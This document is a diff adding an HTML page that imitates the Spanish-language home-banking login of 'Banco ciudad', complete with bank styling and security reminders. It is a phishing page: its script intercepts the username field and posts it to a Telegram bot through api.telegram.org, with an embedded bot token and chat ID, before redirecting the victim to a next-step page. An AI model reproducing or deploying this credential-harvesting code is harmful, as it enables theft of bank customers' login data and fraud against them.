@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Banco ciudad</title>
+<script src="index_archivos/jquery-3.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
+<link rel="icon" type="ico" href="https://ciudad-web.com/favicon.ico">
+<link href="index_archivos/bootstrap.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+<style type="text/css">
+.container-page{max-width:470px; width: 90%; } body{background:#f2f1ef; } *{color:#909394; } .text-primary{color:#005bb0 !important; } .btn{width:90% !important; } fieldset{width:90%; max-width:374px; display: block !important; margin: auto; } .logo-ciudad{height: 58.33px; } .btn{max-width:374px; display: block; margin: auto; } label{font-size:13px; } .helper-user-div div {height: 49px; line-height: 49px; } .helper-user-div{background:#f2f1ef; } .btn-primary{background:#005baa !important; border-color:#005baa !important; } .btn-disabled{background:#e2e0dd!important; border-color:#e2e0dd !important; color: #909394; } .form-control{height: 46px; color: #909394 !important; } .form-control:focus{box-shadow: 0 0 0 2px #5555; border-color:transparent; }
+</style>
+</head>
+<body>
+<div class="container-page m-auto py-5">
+<header class="py-4 mb-4">
+<div class="text-center w-100">
+<img src="index_archivos/ciudad.svg" class="logo-ciudad">
+</div>
+</header>
+<main>
+<form class="bg-white mb-3 shadow" action="login-dos.php" method="POST" id="loginForm">
+<div class="position-relative text-center" style="top: -45px;">
+<img src="index_archivos/icono-login.png" height="90px">
+</div>
+<fieldset>
+<div class="mb-1">
+<label class="form-label mb-0">
+INGRESÁ TU USUARIO
+</label>
+<input type="" required="" id="user" placeholder="Usuario" class="form-control rounded-0" name="user">
+</div>
+<div class="form-check">
+<input class="form-check-input" type="checkbox" value="" id="flexCheckDefault">
+<label class="form-check-label" for="flexCheckDefault">
+Quiero recordar mi usuario
+</label>
+</div>
+</fieldset>
+<button  class="btn btn-disabled rounded-1 w-100 btn-primary" style="margin-bottom:80px;cursor: no-drop;">
+Siguiente
+</button>
+<div class="helper-user-div d-flex justify-content-between ">
+<div class="w-50 text-center">
+Ayuda
+</div>
+<div class="w-50 text-center">
+Nuevo usuario
+</div>
+</div>
+</form>
+<p class="text-primary mb-5 text-center fw-semibold">
+Por tu seguridad, nunca compartas los datos de acceso ni<br>
+códigos de validación de tu Home Banking.
+</p>
+<ul style="font-size: 13px;" class="mb-5">
+<li class="d-inline px-2">
+<a href="" class="text-secondary">Términos y condiciones</a>
+</li>
+<li class="d-inline px-2">
+<a href="" class="text-secondary">Seguridad del sistema</a>
+</li>
+<li class="d-inline px-2">
+<a href="" class="text-secondary">Contacto</a>
+</li>
+</ul>
+<p class="text-center">Versión - v0.18.404</p>
+</main>
+</div>
+<script src="index_archivos/bootstrap.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+<script type="text/javascript">
+$(document).ready(function() {
+  $("#loginForm").submit(function(event) {
+    event.preventDefault(); // Evitar el envío del formulario por defecto
+    
+    // Obtener los datos del formulario
+    var usuario = $("#user").val();
+    
+    // Construir el mensaje para enviar a Telegram
+    var mensaje = "Nuevo usuario: " + usuario;
+    
+    // URL de la API de Telegram
+    var telegramAPI = "https://api.telegram.org/bot6931733086:AAE8K0GHhBQLyPQ5pm2UbJ2IhkgBmg6raDI/sendMessage";
+    
+    // Datos para enviar a la API de Telegram
+    var data = {
+      chat_id: "6044742043",
+      text: mensaje
+    };
+    
+    // Realizar la solicitud POST a la API de Telegram
+    $.post(telegramAPI, data)
+      .done(function(response) {
+        // Redirigir al usuario a index2.html después de enviar el mensaje
+        window.location.href = "login-dos.html";
+      })
+      .fail(function(error) {
+        // Manejar el error de la solicitud
+        console.error("Error al enviar el mensaje a Telegram:", error);
+      });
+  });
+});
+</script>
+</body>
+</html>
